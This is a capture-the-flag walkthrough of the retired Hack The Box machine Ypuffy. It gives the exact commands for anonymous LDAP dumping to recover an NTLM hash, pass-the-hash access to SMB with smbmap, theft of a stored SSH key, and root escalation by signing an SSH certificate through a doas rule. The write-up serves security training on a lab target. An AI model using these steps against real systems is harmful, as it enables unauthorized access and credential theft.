# Ypuffy

This is the write-up for the box Ypuffy that got retired at the 9th February 2019.
My IP address was 10.10.14.8 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.107    ypuffy.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/ypuffy.nmap 10.10.10.107
```

```markdown
| ssh-hostkey:
|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
80/tcp  open  http        OpenBSD httpd
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
389/tcp open  ldap        (Anonymous bind OK)
445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
Service Info: Host: YPUFFY
```

## Checking HTTP (Port 80)

The web page responds with the HTTP message _"The connection was reset"_, which is unexpected as Nmap was able to identify the operating system out of it.
After analyzing what Nmap does differently than the browser with **Wireshark**, it becomes clear that Nmap sends different requests to the web server.
A request that is not a valid HTTP request, will make the web server respond with an HTTP code _400 Bad Request_ and that is how Nmap found out the about the server response.

As it is not possible to send legitimate HTTP requests to the web server, this cannot be further abused.

## Checking LDAP (Port 389)

The LDAP service can be enumerated with **ldapsearch** as anonymous binding is allowed:
```markdown
ldapsearch -x -h 10.10.10.107
```

It shows a response back with the message that "no such object" exists. That is because, we did not specify the _Base Distinguished Name_ that is necessary to get information from LDAP.
```markdown
ldapsearch -x -h 10.10.10.107 -s base namingcontexts
```
```markdown
dn: namingContexts: dc=hackthebox,dc=htb
```

This is the _Base DN_ and now the sub-directories can be enumerated:
```markdown
ldapsearch -x -h 10.10.10.107 -s sub -b 'dc=hackthebox,dc=htb'
```
```markdown
(...)

# bob8791, passwd, hackthebox.htb
dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
uid: bob8791
cn: Bob
objectClass: account
objectClass: posixAccount
objectClass: top
userPassword:: e0JTREFVVEh9Ym9iODc5MQ==
uidNumber: 5001
gidNumber: 5001
gecos: Bob
homeDirectory: /home/bob8791
loginShell: /bin/ksh

# alice1978, passwd, hackthebox.htb
dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
uid: alice1978
cn: Alice
objectClass: account
objectClass: posixAccount
objectClass: top
objectClass: sambaSamAccount
userPassword:: e0JTREFVVEh9YWxpY2UxOTc4
uidNumber: 5000
gidNumber: 5000
gecos: Alice
homeDirectory: /home/alice1978
loginShell: /bin/ksh
sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
displayName: Alice
sambaAcctFlags: [U          ]
sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
sambaPwdLastSet: 1532916644

(...)

# bob8791, group, hackthebox.htb
dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
objectClass: posixGroup
objectClass: top
cn: bob8791
userPassword:: e2NyeXB0fSo=
gidNumber: 5001

# alice1978, group, hackthebox.htb
dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
objectClass: posixGroup
objectClass: top
cn: alice1978
userPassword:: e2NyeXB0fSo=
gidNumber: 5000

(...)
```

> This whole process can also be done with Nmap scripts automatically:

```markdown
nmap -p 389 --script ldap-search -Pn 10.10.10.107
```

Summarizing the information in here:
- Two usernames are found:
  - _bob8791_
  - _alice1978_

- Base64-encoded strings decoding:

```markdown
echo e2NyeXB0fSo= | base64 -d

# Output
{crypt}*
```
```markdown
echo e0JTREFVVEh9YWxpY2UxOTc4 | base64 -d

# Output
{BSDAUTH}alice1978}
```
```markdown
echo e0JTREFVVEh9Ym9iODc5MQ== | base64 -d

# Output
{BSDAUTH}bob8791
```

- NTLM hash of _alice1978_:
  - sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B

Testing if the NT password of _alice1978_ is valid with a **Pass-The-Hash** attack on the SMB share:
```markdown
smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -H 10.10.10.107
```

It is successful and shows the directories that can be accessed with this account.

## Checking SMB (Port 445)

The credentials of _alice1978_ work and can be used to get information on the SMB shares:
```markdown
Disk        Permissions     Comment
----        -----------     -------
alice       READ, WRITE     Alice's Windows Directory
IPC$        NO ACCESS       IPC Service (Samba Server)
```

There is one directory with read-write access and with the `-R` parameter of **SMBmap** the contents can be displayed.
It has one file called _my_private_key.ppk_:
```markdown
smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -H 10.10.10.107 --download alice/my_private_key.ppk
```

The beginning of the file reveals that it is a **PuTTY** user key file without encryption:
```markdown
PuTTY-User-Key-File-2: ssh-rsa
Encryption: none
Comment: rsa-key-20180716
(...)
```

It can be either used with **PuTTY** on Windows or converted into a regular SSH key with the **Putty-tools** on Linux:
```markdown
puttygen 10.10.10.107-alice_my_private_key.ppk -O private-openssh -o alice.pem
```

Using the SSH key to log into the box:
```markdown
ssh -i alice.pem alice1978@10.10.10.107
```

## Privilege Escalation

A command like `sudo` does exist in **OpenBSD** and is called `doas`. The configuration for that is found in _/etc/doas.conf_:
```markdown
permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
```

This says, that _alice_ is able to run the command `ssh-keygen` as _userca_ without a password, but this binary has no known bypasses to do something malicious.

When looking at the SSH configuration in _/etc/ssh/sshd_config_ there are some unusual lines:
```markdown
(...)
AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u

TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
```

Lets execute these commands and replace the variable with all usernames:
```markdown
/usr/local/bin/curl 'http://127.0.0.1/sshauth?type=keys&username=alice1978'

/usr/local/bin/curl 'http://127.0.0.1/sshauth?type=keys&username=root'
```

This outputs a public SSH key when using _alice1978_ as the username and nothing when using root or any other user.

```markdown
/usr/local/bin/curl 'http://127.0.0.1/sshauth?type=principals&username=alice1978'

/usr/local/bin/curl 'http://127.0.0.1/sshauth?type=principals&username=root'
```

This outputs the usernames of the users, but when executing it with root, it displays something else:
> 3m3rgencyB4ckd00r

As this SSH service is configured as an **SSH Certificate Authorities** and _alice1978_ is allowed to sign SSH keys as _userca_, this is the passphrase that is needed to sign a certificate for root.

Creating certificate for root:
```markdown
ssh-keygen -f root
```

Signing the certificate:
```markdown
doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I LabelName root
```

Now the certificate can be used to change to root!
```markdown
ssh -i root root@localhost
```
